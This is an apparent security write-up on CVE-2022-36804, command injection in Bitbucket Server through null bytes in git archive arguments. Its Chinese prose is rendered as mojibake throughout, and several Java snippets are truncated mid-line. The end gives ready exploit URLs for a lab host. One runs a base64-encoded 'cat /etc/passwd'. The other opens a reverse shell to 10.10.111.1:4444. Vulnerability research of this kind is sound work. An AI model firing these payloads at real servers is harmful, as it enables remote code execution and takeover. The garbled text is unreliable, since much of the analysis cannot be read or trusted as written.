â—‹
è¡¥ä¸åˆ†æ
addIf(NioProcessParameters$Builder::nonNullAndNoNullChar, this.arguments, v
alue);
1
Java
å¤åˆ¶ä»£ç 
    private static boolean nonNullAndNoNullChar(String value) {
        if (value == null) {
            return false;
        } else {
            requireNoNullChars(value);
            return true;
        }
    }
    private static void requireNoNullChars(String value) {
        if (value.indexOf(0) >= 0) {
            throw new IllegalArgumentException("Unsupported \\0 character 
detected: " + value);
        }
    }
    private static String requireNonBlankAndNoNullChar(String value, Strin
g msg) {
        requireNonBlank(value, msg);
        requireNoNullChars(value);
        return value;
    }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
Java
å¤åˆ¶ä»£ç 
11
ï¼ˆ2ï¼‰ nuprocess-2.0.2-atlassian-3.jar çš„è¡¥ä¸ 
å¢åŠ äº† ensureNoNullCharacters æ ¡éªŒï¼Œ 
12
å‡½æ•°çš„ä½œâ½¤ï¼Œä¾ç„¶æ˜¯åœ¨æ ¡éªŒä¸èƒ½æœ‰NULLå­—ç¬¦ã€‚ 
public class NuProcessBuilder {
    private static final NuProcessFactory factory;
    private final List command;
    private final TreeMap environment;
    private Path cwd;
    private NuProcessHandler processListener;
    public NuProcessBuilder(List commands, Map env
ironment) {
        if (commands != null && !commands.isEmpty()) {
            this.ensureNoNullCharacters(commands); //patch
            this.environment = new TreeMap(environment);
            this.command = new ArrayList(commands);
        } else {
            throw new IllegalArgumentException("List of commands may not b
e null or empty");
        }
    }
    public NuProcessBuilder(List commands) {
        if (commands != null && !commands.isEmpty()) {
            this.ensureNoNullCharacters(commands); //patch
            this.environment = new TreeMap(System.getenv());
            this.command = new ArrayList(commands);
        } else {
            throw new IllegalArgumentException("List of commands may not b
e null or empty");
        }
    }
    public NuProcessBuilder(String... commands) {
        if (commands != null && commands.length != 0) {
            List commandsList = Arrays.asList(commands); 
//patc
h
            this.ensureNoNullCharacters(commandsList); //patch
            this.environment = new TreeMap(System.getenv());
            this.command = new ArrayList(commandsList);
        } else {
            throw new IllegalArgumentException("List of commands may not b
e null or empty");
        }
    }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
Java
å¤åˆ¶ä»£ç 
13
æ‰€ä»¥ï¼Œä¸ºå•¥è¦å¯¹NULLå­—ç¬¦è¿›â¾é‡é‡æ ¡éªŒï¼Ÿ 
åˆæ­¥çŒœæµ‹ï¼Œæ”»å‡»è€…é€šè¿‡æŸç§â½…å¼è°ƒâ½¤äº†å‘½ä»¤æ‰§â¾å‡½æ•°ï¼Œâ¼¿æ³•å¯èƒ½æœ‰ï¼š
ä»»æ„å¯¹è±¡å®ä¾‹åŒ–ï¼ˆç±»ä¼¼Spring-Coreååºåˆ—ï¼Œæ›´æ”¹äº†æŸäº›é‡è¦å˜é‡ï¼›ä½†å†å²ä¸Šåªæœ‰7995ç«¯â¼å‡ºè¿‡å
åºåˆ—ï¼ŒHTTPç«¯â¼æ²¡æœ‰ï¼‰ 
æŸäº›å†·â»”Featureï¼Œä¾‹å¦‚scmé‚£â¼€å †æ—§çš„åŠŸèƒ½ï¼Œæˆ‘æœªè·Ÿè¿›ï¼Œä¸è¿‡çœ‹å†å²â½‚ç« ï¼Œå¯èƒ½ä¼šæœ‰æå¤´ã€‚ 
å†é€šè¿‡NULLå­—èŠ‚ç»•è¿‡äº†æŸäº›é™åˆ¶ï¼Ÿï¼Ÿå¤©â»¢â¾ç©ºèµ·æ¥ã€‚ã€‚ 
æš‚æ—¶
æ²¡æœ‰æ‰¾åˆ°å‘½ä»¤æ‰§â¾å¤„çš„è°ƒâ½¤ç‚¹
â—
â—
â—
private void ensureNoNullCharacters(List commands) {
    Iterator var2 = commands.iterator();
    String command;
    do {
        if (!var2.hasNext()) {
            return;
        }
        command = (String)var2.next();
    } while(command.indexOf(0)  command = new ArrayList(Arrays.asList(stringArray));
        String[] cmdarray = (String[])command.toArray(new String[0]);
        byte[][] args = new byte[cmdarray.length - 1][];
        System.out.println( args );
        int size = args.length;
    // å– git å‘½ä»¤æ•°ç»„å‚æ•°ï¼Œç¬¬0ä½ä¹‹åï¼Œå­˜å‚¨åˆ° args[][]
        for(int i = 0; i "} ï¼Œè‹¥  å¯æ§ï¼Œä¹Ÿä¸èƒ½æ³¨â¼Šå…¶å®ƒçš„å‘½ä»¤ã€‚å› ä¸º
æ­¤æ—¶æ‰§â¾å‘½ä»¤çš„ä¸»ä½“æ˜¯gitï¼Œâ½½ä¸æ˜¯å…¶å®ƒå¯æ‰§â¾â½‚ä»¶ã€‚ç¬¬â¼†ä¸ªå‚æ•°çš„æ‰€æœ‰å†…å®¹ï¼Œéƒ½åªä¼šè¢«è§†ä¸ºæ˜¯gitå‘½ä»¤
çš„é€‰é¡¹ã€‚
ï¼ˆ3ï¼‰ä¸ºä»€ä¹ˆæ˜¯git archive? 
# è¾“â¼Š
{"git", "archive", "Hello\u0000World!", "-- "};  
# è¾“å‡º
[a, r, c, h, i, v, e, , H, e, l, l, o,  , W, o, r, l, d, !, 
, -, -,  , ]
==  {'archive', 'Hello', 'World!', '--' }
1
2
3
4
5
6
7
Java
å¤åˆ¶ä»£ç 
18
archiveæœ‰  --exec é€‰é¡¹ï¼Œå¯ä»¥è¢«æ»¥â½¤æ¥æ‰§â¾å‘½ä»¤ã€‚ 
æ³¨æ„ï¼šæ‰§â¾çš„å‘½ä»¤å¹¶â¾®å®Œå…¨å›æ˜¾ï¼Œä¼šè¢«æˆªæ–­ï¼›è§†ä½œâ½†å›æ˜¾çš„RCEå°±â¾äº† 
ä¾‹å¦‚ï¼Œæ‰§â¾ cat /etc/passwd ï¼Œåªæ˜¾ç¤ºäº†  root  
EXP 
https://github.com/notxesh/CVE-2022-36804-PoC/blob/main/CVE-2022-36804.py
# rce
http://10.10.111.35:7990/rest/api/latest/projects/PUB/repos/repo/archive?fo
rmat=zip&&path=&prefix=test/%00--remote=''%00--exec=echo+'Y2F0IC9ldGMvcGFzc
3dkCg=='+%7c+base64+-d++%7c+sh;%00
# åå¼¹shell
http://10.10.111.35:7990/rest/api/latest/projects/PUB/repos/repo/archive?fo
rmat=zip&=&path=&prefix=test/%00--remote=''%00--exec=echo+'YmFzaCAtaSA%2bJi
AvZGV2L3RjcC8xMC4xMC4xMTEuMS80NDQ0IDA%2bJjEK'+%7c+base64+-d++%7c+sh;%00
1
2
3
4
5
6
Basic
å¤åˆ¶ä»£ç 
19
Install Note:https://confluence.atlassian.com/bitbucketserver/supported-platforms-
776640981.html 
https://www.geek-share.com/detail/2803770907.html 
https://www.anquanke.com/post/id/280193 
Ref 
â—
â—
â—
â— ğŸ“2019ç¬¬äº”å±Šäº’è”â½¹å®‰å…¨é¢†è¢–å³°ä¼š_å¯¹åŸºäºGitçš„ç‰ˆæœ¬æ§åˆ¶æœåŠ¡çš„é€šâ½¤æ”»å‡»â¾¯çš„æ¢ç´¢.pdf